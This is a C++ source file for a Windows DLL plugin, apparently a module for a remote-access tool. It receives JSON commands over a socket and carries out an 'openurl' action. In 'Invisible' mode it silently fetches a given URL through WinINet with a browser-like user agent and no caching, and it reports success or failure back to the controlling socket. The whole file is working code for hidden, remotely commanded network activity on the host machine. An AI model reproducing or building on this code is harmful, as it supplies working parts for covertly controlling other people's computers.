#define WIN32_LEAN_AND_MEAN
#include <winsock2.h>
#include <windows.h>
#include <shellapi.h>
#include <wininet.h>
#include <string>
#include "../../include/json.hpp"
#pragma comment(lib, "ws2_32.lib")
#pragma comment(lib, "shell32.lib")
#pragma comment(lib, "wininet.lib")
using json = nlohmann::json;
using namespace std;

static bool safe_send_json(SOCKET sock, const json& data) {
    try {
        string serialized = data.dump(-1, ' ', false, json::error_handler_t::replace);
        string msg = serialized + "\r\n";
        int total = 0;
        int len = (int)msg.size();
        while (total < len) {
            int sent = send(sock, msg.c_str() + total, len - total, 0);
            if (sent == SOCKET_ERROR) return false;
            total += sent;
        }
        return true;
    } catch (...) {
        return false;
    }
}

// URL'yi parse et: protocol, host, path ayır
struct ParsedUrl {
    string protocol; // "http" veya "https"
    string host;
    string path;
    INTERNET_PORT port;
    bool valid = false;
};

static ParsedUrl parse_url(const string& url) {
    ParsedUrl p;
    URL_COMPONENTSA uc = {};
    uc.dwStructSize = sizeof(uc);

    char scheme[16]   = {};
    char host[256]    = {};
    char urlPath[1024]= {};

    uc.lpszScheme    = scheme;    uc.dwSchemeLength    = sizeof(scheme);
    uc.lpszHostName  = host;      uc.dwHostNameLength  = sizeof(host);
    uc.lpszUrlPath   = urlPath;   uc.dwUrlPathLength   = sizeof(urlPath);

    if (!InternetCrackUrlA(url.c_str(), (DWORD)url.size(), 0, &uc)) return p;

    p.protocol = scheme;
    p.host     = host;
    p.path     = (strlen(urlPath) > 0) ? urlPath : "/";
    p.port     = uc.nPort;
    p.valid    = true;
    return p;
}

// WinINet ile görünmez HTTP/HTTPS GET isteği
static bool open_url_invisible(const string& url, string& errorOut) {
    ParsedUrl p = parse_url(url);
    if (!p.valid) {
        errorOut = "URL parse failed";
        return false;
    }

    HINTERNET hInternet = InternetOpenA(
        "Mozilla/5.0",
        INTERNET_OPEN_TYPE_PRECONFIG,
        NULL, NULL, 0
    );
    if (!hInternet) {
        errorOut = "InternetOpen failed (" + to_string(GetLastError()) + ")";
        return false;
    }

    DWORD flags = (p.protocol == "https")
        ? INTERNET_FLAG_SECURE | INTERNET_FLAG_RELOAD | INTERNET_FLAG_NO_CACHE_WRITE
        : INTERNET_FLAG_RELOAD | INTERNET_FLAG_NO_CACHE_WRITE;

    HINTERNET hUrl = InternetOpenUrlA(
        hInternet,
        url.c_str(),
        NULL, 0,
        flags,
        0
    );

    if (!hUrl) {
        DWORD err = GetLastError();
        InternetCloseHandle(hInternet);
        errorOut = "InternetOpenUrl failed (" + to_string(err) + ")";
        return false;
    }

    // İsteği tamamlamak için birkaç byte oku
    char buf[512];
    DWORD bytesRead = 0;
    InternetReadFile(hUrl, buf, sizeof(buf), &bytesRead);

    InternetCloseHandle(hUrl);
    InternetCloseHandle(hInternet);
    return true;
}

extern "C" __declspec(dllexport) void RunPlugin(SOCKET sock) {
    // Basic plugin execution logic if needed
}

extern "C" __declspec(dllexport) void HandleCommand(SOCKET sock, const char* commandJson) {
    try {
        if (!commandJson) return;
        json command = json::parse(commandJson);
        string action = command.value("action", "");

        if (action == "openurl") {
            string url  = command.value("url", "");
            string mode = command.value("mode", "Visible");

            if (url.empty()) {
                safe_send_json(sock, {
                    {"action",  "openurl_response"},
                    {"status",  "error"},
                    {"message", "URL is empty"}
                });
                return;
            }

            if (mode == "Invisible") {
                string errMsg;
                bool ok = open_url_invisible(url, errMsg);
                if (ok) {
                    safe_send_json(sock, {
                        {"action", "openurl_response"},
                        {"status", "success"},
                        {"url",    url},
                        {"mode",   mode}
                    });
                } else {
                    safe_send_json(sock, {
                        {"action",  "openurl_response"},
                        {"status",  "error"},
                        {"message", errMsg}
                    });
                }
            } else {
                // Visible: mevcut ShellExecute davranışı korundu
                HINSTANCE res = ShellExecuteA(NULL, "open", url.c_str(), NULL, NULL, SW_SHOWNORMAL);
                if ((INT_PTR)res > 32) {
                    safe_send_json(sock, {
                        {"action", "openurl_response"},
                        {"status", "success"},
                        {"url",    url},
                        {"mode",   mode}
                    });
                } else {
                    safe_send_json(sock, {
                        {"action",  "openurl_response"},
                        {"status",  "error"},
                        {"message", "ShellExecute failed (Code: " + to_string((INT_PTR)res) + ")"}
                    });
                }
            }
        }
    } catch (const std::exception& e) {
        safe_send_json(sock, {
            {"action",  "openurl_response"},
            {"status",  "error"},
            {"message", string("Plugin Exception: ") + e.what()}
        });
    } catch (...) {
        safe_send_json(sock, {
            {"action",  "openurl_response"},
            {"status",  "error"},
            {"message", "Unknown Plugin Exception"}
        });
    }
}

BOOL APIENTRY DllMain(HMODULE, DWORD, LPVOID) { return TRUE; }